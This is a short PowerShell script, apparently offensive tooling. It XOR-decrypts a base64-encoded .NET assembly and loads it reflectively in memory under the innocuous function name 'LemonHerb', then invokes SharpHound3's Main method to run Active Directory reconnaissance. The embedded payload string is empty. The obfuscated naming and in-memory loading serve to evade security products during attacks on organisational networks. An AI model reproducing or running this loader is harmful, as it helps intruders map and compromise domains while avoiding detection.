$e7f987f4 = ""
function Load-LemonHerb { param([Parameter ()] $xk = "")
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($e7f987f4)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
[System.Reflection.Assembly]::Load($fb)
}
function Invoke-LemonHerb { param([Parameter ()] $Args = "")
$Args -eq "" -and ($Args = Read-Host "Specify command arguments")
try {[SharpHound3.SharpHound]::"Main"($Args.split())}
catch { try {$asm.GetType("SharpHound3.SharpHound", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))}
catch {$asm.GetType([SharpHound3.SharpHound], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))}}
}
